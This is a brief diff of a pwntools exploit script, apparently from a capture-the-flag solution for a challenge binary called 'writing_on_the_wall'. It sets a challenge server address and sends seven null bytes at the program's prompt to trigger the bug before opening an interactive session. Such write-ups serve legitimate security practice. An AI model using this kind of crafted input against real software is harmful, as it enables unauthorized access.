@@ -562,7 +562,7 @@ import warnings
 
 warnings.filterwarnings("ignore",category=BytesWarning)
 
-exe = context.binary = ELF('./writing_on_the_wall_patched')
+exe = context.binary = ELF('./writing_on_the_wall')
 
 host = "83.136.250.12"
 port = 48086
@@ -575,7 +575,7 @@ p = exe.process()
 #p = remote(host,port)
 #p = gdb.debug('./', gdbscript = gdb_script)
 
-p.sendlineafter(">> ", b"\x00"*7)
+p.sendlineafter(">> ", b"\x00" * 7)
 
 p.interactive()   
 ```
